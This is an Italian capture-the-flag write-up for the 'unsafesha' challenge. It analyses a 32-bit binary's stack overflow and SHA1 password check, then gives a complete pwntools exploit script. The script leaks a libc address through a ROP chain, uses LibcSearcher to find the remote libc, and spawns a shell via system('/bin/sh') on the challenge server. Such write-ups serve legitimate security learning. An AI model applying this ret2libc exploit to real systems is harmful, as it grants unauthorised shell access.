```c
checksec --file=./unsafesha
[*] '/home/francesco/Downloads/unsafesha'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

```

Analisi del binario

```c
builtin_strncpy(buffer,"not so easy, uh?",16);  // buffer[0:16] = costante
ccread(stdin, 336, buffer + 16);               // input dell'utente a partire da buffer+16
```

Il nostro input finisce in buffer[16:16+336] → **oltre i 96 byte allocati → overflow**

Segue

```c
SHA1_Update(&ctx, buffer+16, len_input);
SHA1_Final(buffer_byte, &ctx);
```

Viene calcolato SHA1(input) → primi 4 byte sono reinterpretati come uint32, XORati con 0xc398d997, poi si verifica:

```c
if (buffer_byte[0] != 0 && strncmp(buffer, buffer_byte, strlen(buffer_byte)) == 0)
    puts("Logged in!");
```

Se riusciamo a trovare un input tale che:

- SHA1(input)[0:4] ^ 0xc398d997 = buffer[0:4]
- allora entriamo in Logged in!

Il programma fa anche puts("Password: ");, poi chiama ccread() con 336 byte → overflow totale di 336 - (96 - 16) = **256 byte oltre la fine del buffer**.

Niente canary, niente PIE → possiamo sovrascrivere il return address.

L’obiettivo è:

1. Fare leak di un indirizzo da GOT (es. puts@got)
2. Calcolare la base della libc remota
3. ROP chain per eseguire system("/bin/sh")

Per far funzionare il nostro attacco dobbiamo bypassare il controllo password. Con un semplice algoritmo che genera password valide troviamo una password adatta: 

```c
password = b"0hwajb2Q\x00"
```

Il byte nullo alla fine ci servirà in seguito.

### Exploit

Costruiamo una ROP chain con:

```c
pl = password + b"A" * (OFFSET - len(password))
pl += p32(elf.plt['puts'])       # chiamata a puts
pl += p32(elf.symbols['main'])   # ritorna al main per retry
pl += p32(elf.got['puts'])       # argomento per puts
```

Riceviamo 4 byte → leak di puts.

Grazie a LibcSearcher, usiamo l’offset di puts per determinare la versione esatta di libc usata **in remoto**.

Costruiamo la ROP finale:

```c
pl = password + b"A" * (OFFSET - len(password))
pl += p32(system)
pl += p32(exit)
pl += p32(binsh)
```

Codice completo

```c
#!/usr/bin/env python3
from pwn import *
from hashlib import sha1
import itertools, string
import hashlib
from LibcSearcher import LibcSearcher

elf  = ELF('./unsafesha')

OFFSET = 100

# --------------------------------------------------
def leak_payload():
	password = b"0hwajb2Q\x00"
	pl = password + b"A" * (OFFSET - len(password))
	pl += p32(elf.plt['puts'])
	pl += p32(elf.symbols['main'])
	pl += p32(elf.got['puts'])
	return pl

def shell_payload(base, remote_libc):
	# Usiamo remote_libc.dump() per ottenere gli offset corretti per la libc remota
	system = base + remote_libc.dump('system')
	binsh  = base + remote_libc.dump('str_bin_sh') # LibcSearcher a volte usa 'str_bin_sh'
	exitfn = base + remote_libc.dump('exit')

	print(f"System: {system:#x}\nBin: {binsh:#x}\nExit: {exitfn:#x}")
	password = b"0hwajb2Q\x00"
	pl = password + b"A" * (OFFSET - len(password))

	pl += p32(system)
	pl += p32(exitfn)
	pl += p32(binsh)
	return pl
# --------------------------------------------------

io = remote('unsafesha.challs.cyberchallenge.it', 9262)
# io = process("./unsafesha")

io.sendlineafter(b'Password: ', leak_payload())

io.recvuntil(b"Logged in!\n")

leak = u32(io.recv(4))
log.success(f"puts leak: {leak:#x}")

log.info("Cercando la libc remota con LibcSearcher...")
libc = LibcSearcher("puts", leak)

libc_base = leak - libc.dump("puts")
log.success(f"libc base: {libc_base:#x}")

io.sendlineafter(b'Password: ', shell_payload(libc_base, libc))
io.interactive()
```